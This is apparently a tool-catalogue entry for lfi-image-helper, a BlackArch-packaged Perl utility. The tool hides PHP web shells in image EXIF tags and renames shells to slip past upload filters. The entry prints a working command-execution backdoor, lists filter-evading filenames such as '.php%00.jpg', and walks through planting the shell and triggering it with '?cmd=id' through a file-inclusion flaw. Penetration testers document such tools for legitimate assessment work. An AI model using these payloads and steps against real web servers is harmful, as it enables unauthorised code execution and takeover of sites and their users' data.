---
name: "lfi-image-helper"
categories:
  - blackarch-webapp
version: "0.8"
homepage: "http://packetstormsecurity.com/files/129871/LFI-Image-Helper.8.html"
packaged-by: [blackarch]
blackarch-builddate: "2025-07-18"
build-system: perl
license: custom:unknown
meta-checked: "2026-11-09"
worth: 0.4
worth-basis: "adoption-only (no upstream data)"
worth-checked: "2026-11-09"
---

# lfi-image-helper

> Perl EXIF toolkit for LFI attacks: plants PHP backdoors inside image metadata tags and renames shell files to slip past upload filters.

## What it's for

LFI Image Helper (Perl, by Doddy Hackman, 2015, distributed via Packet Storm) prepares the payload side of file-inclusion attacks. Its EXIF operations (built on Image::ExifTool) dump, read, create, update and delete metadata tags on any image — and its `--backdoor` mode writes a chosen PHP shell into an image's `Model` tag, producing a file that still renders as a picture but carries executable PHP that fires when the image is included by a vulnerable script. Its `--bypass` mode instead renames/copies a PHP shell to upload-filter-evading names (`.jpg.php`, `.php;test.jpg`, `.php%00.jpg`). It crafts payloads only: finding the LFI or upload weakness is your job (see siblings [[lfi-exploiter]], [[lfi-fuzzploit]], [[lfi-sploiter]], [[lfifreak]] for the inclusion side).

## Typical use cases

### Inspect an image's EXIF metadata

See what tags a file carries before and after tampering.

```
lfi-image-helper --dump_all photo.jpg
```

Outcome: prints every EXIF tag and value found in the file; `--dump_tags photo.jpg` lists just tag names, and `--read_tag photo.jpg --tag Model` prints one tag's value — the quick way to verify where a payload landed.

### Plant a PHP backdoor inside an image

Make an image that executes on inclusion.

```
lfi-image-helper --backdoor photo.jpg --file shell.jpg
# then pick a shell at the prompt, e.g. 1 (Simple Backdoor: <?php system($_GET["cmd"]);exit(1); ?>)
```

Outcome: writes `shell.jpg` (via `--file`) containing the chosen backdoor from the built-in list (Simple Backdoor, System Shell, Eval Shell, Sneaky Shell, r0ng Shell) stored in the image's `Model` tag, then chmods it 0777 and prints `Backdoor : OK` — request it through an LFI with the matching parameter (e.g. `?cmd=id`) to execute.

### Rename a shell to defeat upload filters

Mangle a PHP file's extension for restrictive uploaders.

```
lfi-image-helper --bypass shell.php --file shell
# then pick a form at the prompt, e.g. 3 (bypass.php%00.jpg)
```

Outcome: saves the shell's source under the chosen filter-bypassing name (`shell.jpg.php`, `shell.php;test.jpg` or `shell.php%00.jpg`), chmod 0777, and prints `PHP Shell Bypassed` — for upload forms that blacklist or truncate extensions rather than validate content.

No corpus evidence — derived from the packaged upstream source (Packet Storm `LFI_Image_Helper.zip`; GetOptions and backdoor/bypass code paths read from `image.pl`; BlackArch installs it as `/usr/bin/lfi-image-helper`).
